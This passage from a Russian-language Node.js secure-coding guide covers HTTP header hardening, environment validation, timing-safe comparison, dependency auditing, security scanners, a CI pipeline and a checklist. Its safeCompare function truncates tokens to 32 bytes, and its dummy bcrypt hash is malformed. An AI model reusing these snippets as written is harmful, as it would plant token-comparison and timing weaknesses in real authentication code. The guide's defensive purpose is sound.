app.use(helmet({
  contentSecurityPolicy: { /* ... */ },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginResourcePolicy: { policy: 'same-site' },
  dnsPrefetchControl: { allow: false },
  frameguard: { action: 'deny' },
  hsts: { maxAge: 31536000, includeSubDomains: true },
  ieNoOpen: true,
  noSniff: true,              // X-Content-Type-Options: nosniff
  originAgentCluster: true,
  permittedCrossDomainPolicies: false,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  xssFilter: true,
}));

// ── Ограничение размера запроса ───────────────────────────────────────────
app.use(express.json({ limit: '10kb' }));    // JSON body limit
app.use(express.urlencoded({ limit: '10kb', extended: false }));

// ── HPP — HTTP Parameter Pollution ───────────────────────────────────────
import hpp from 'hpp';
app.use(hpp()); // ?role=user&role=admin → берёт только последний

// ── Безопасные переменные окружения ──────────────────────────────────────
// .env — НИКОГДА не коммитить!
// .gitignore: .env, .env.*

// Валидация env при старте
import { z } from 'zod';

const EnvSchema = z.object({
  NODE_ENV: z.enum(['development', 'test', 'production']),
  PORT: z.string().transform(Number).pipe(z.number().int().positive()),
  DATABASE_URL: z.string().url(),
  JWT_SECRET: z.string().min(32),
  COOKIE_SECRET: z.string().min(32),
});

const env = EnvSchema.parse(process.env);

// ── Безопасная обработка ошибок ───────────────────────────────────────────
// ❌ Раскрывать стек в продакшне
app.use((err, req, res, next) => {
  console.error(err); // логировать полностью
  res.status(500).json({
    error: process.env.NODE_ENV === 'production'
      ? 'Internal server error'     // ничего лишнего
      : err.message                 // только в dev
  });
});

// ── Защита от Parameter Pollution ────────────────────────────────────────
// Всегда валидировать query-параметры
app.get('/users', (req, res) => {
  const page = Math.max(1, parseInt(req.query.page) || 1);
  const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 20));
  // ...
});
```

---

## 17. npm и окружение

```bash
# Аудит в CI/CD
npm audit --audit-level=critical
npx better-npm-audit audit

# Snyk — глубокий анализ
npx snyk test
npx snyk monitor

# SBOM — Software Bill of Materials
npx cyclonedx-npm --output-file sbom.json

# Проверка лицензий
npx license-checker --onlyAllow 'MIT;Apache-2.0;BSD-2-Clause;BSD-3-Clause'
```

```javascript
// .npmrc — безопасные настройки проекта
// save-exact=true
// package-lock=true
// audit=true
// ignore-scripts=false  ← только если нужны build-скрипты

// Pinning версий в package.json (без ^ и ~)
{
  "dependencies": {
    "express": "4.18.2",   // ✅ точная версия
    "lodash": "^4.17.21"   // ⚠️ разрешены патчи
  }
}
```

---

## 18. Таймингові атаки

```javascript
// Проблема: разное время ответа раскрывает существование данных

// ❌ Уязвимо — строка короче → возвращается быстрее
function checkToken(userToken, validToken) {
  return userToken === validToken;
}

// ✅ Node.js — встроенная функция
import crypto from 'crypto';

function safeCompare(a, b) {
  // Одинаковая длина обязательна для timingSafeEqual
  const aBuffer = Buffer.alloc(32);
  const bBuffer = Buffer.alloc(32);
  Buffer.from(a).copy(aBuffer);
  Buffer.from(b).copy(bBuffer);
  return crypto.timingSafeEqual(aBuffer, bBuffer);
}

// Для логина — одинаковое время при существующем/несуществующем пользователе
async function login(email, password) {
  const user = await User.findOne({ email });

  // Всегда выполняем bcrypt, даже если пользователь не найден
  const dummyHash = '$2b$12$dummy.hash.to.prevent.timing.attack.padding';
  const hashToCheck = user?.passwordHash ?? dummyHash;

  const isValid = await bcrypt.compare(password, hashToCheck);

  if (!user || !isValid) {
    throw new Error('Invalid credentials'); // одно сообщение для обоих случаев
  }

  return createSession(user);
}
```

---

## 19. Инструменты и автоматизация

### 19.1 Статический анализ

```bash
# ESLint с security-плагинами
npm install --save-dev eslint eslint-plugin-security eslint-plugin-no-unsanitized

# .eslintrc.json
{
  "plugins": ["security", "no-unsanitized"],
  "extends": ["plugin:security/recommended"],
  "rules": {
    "no-unsanitized/method": "error",
    "no-unsanitized/property": "error",
    "security/detect-eval-with-expression": "error",
    "security/detect-non-literal-regexp": "warn",
    "security/detect-object-injection": "warn",
    "security/detect-possible-timing-attacks": "error"
  }
}

# Semgrep — мощный SAST
npx semgrep --config=p/javascript --config=p/nodejs

# CodeQL (GitHub Actions)
# .github/workflows/codeql.yml
```

---

### 19.2 DAST и тестирование

```bash
# OWASP ZAP — динамический анализ
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://myapp.com -r zap-report.html

# Nikto — веб-сканер
nikto -h https://myapp.com

# nuclei — шаблонный сканер
nuclei -u https://myapp.com -t cves/ -t exposures/
```

---

### 19.3 GitHub Actions — security pipeline

```yaml
# .github/workflows/security.yml
name: Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: npm audit
        run: npm audit --audit-level=high

      - name: Snyk vulnerability scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      - name: Semgrep SAST
        uses: returntocorp/semgrep-action@v1
        with:
          config: p/javascript p/nodejs p/owasp-top-ten

      - name: Check secrets in code
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
```

---

## 20. Чеклист безопасности

### XSS & Injection
- [ ] Весь пользовательский ввод экранируется через `esc()` или `textContent`
- [ ] DOMPurify для HTML-контента от пользователей
- [ ] Trusted Types включены в CSP
- [ ] Нет `innerHTML`, `eval`, `document.write` с пользовательскими данными
- [ ] Параметризованные запросы в БД
- [ ] Валидация и санитизация NoSQL-операторов

### CSRF & Аутентификация
- [ ] CSRF-токены для всех state-changing запросов
- [ ] SameSite=Strict для сессионных кук
- [ ] JWT хранятся в памяти, refresh — в httpOnly-куке
- [ ] Bcrypt/Argon2 для паролей (salt rounds ≥ 12)
- [ ] Rate limiting на /login и /register
- [ ] MFA для критичных операций

### Заголовки и транспорт
- [ ] HTTPS принудительно (HSTS включён)
- [ ] Content Security Policy настроен
- [ ] X-Frame-Options: DENY
- [ ] X-Content-Type-Options: nosniff
- [ ] Referrer-Policy настроен
- [ ] Permissions-Policy ограничивает API браузера

### Данные и хранение
- [ ] Чувствительные данные не в localStorage
- [ ] Куки: httpOnly + secure + sameSite
- [ ] Secrets только в переменных окружения
- [ ] .env в .gitignore
- [ ] Логи не содержат паролей/токенов

### Зависимости
- [ ] `npm audit` в CI/CD
- [ ] Точные версии или lockfile зафиксирован
- [ ] SRI для внешних скриптов
- [ ] Регулярное обновление зависимостей

### Код и конфигурация
- [ ] ESLint с security-плагинами
- [ ] Нет захардкоженных секретов (trufflehog)
- [ ] Ошибки не раскрывают детали в production
- [ ] Таймингово-безопасное сравнение токенов
- [ ] postMessage проверяет origin

---

## Ресурсы

| Ресурс | Описание |
|--------|----------|
| [OWASP Top 10](https://owasp.org/www-project-top-ten/) | Топ уязвимостей |
| [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/) | Стандарт верификации |
| [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security) | Документация браузера |
| [Node.js Security](https://nodejs.org/en/docs/guides/security) | Официальное руководство |
| [snyk.io](https://snyk.io) | База уязвимостей |
| [cve.mitre.org](https://cve.mitre.org) | CVE база данных |

---

*Руководство охватывает OWASP Top 10 (2021), актуально для Node.js 18+ и современных браузеров.*
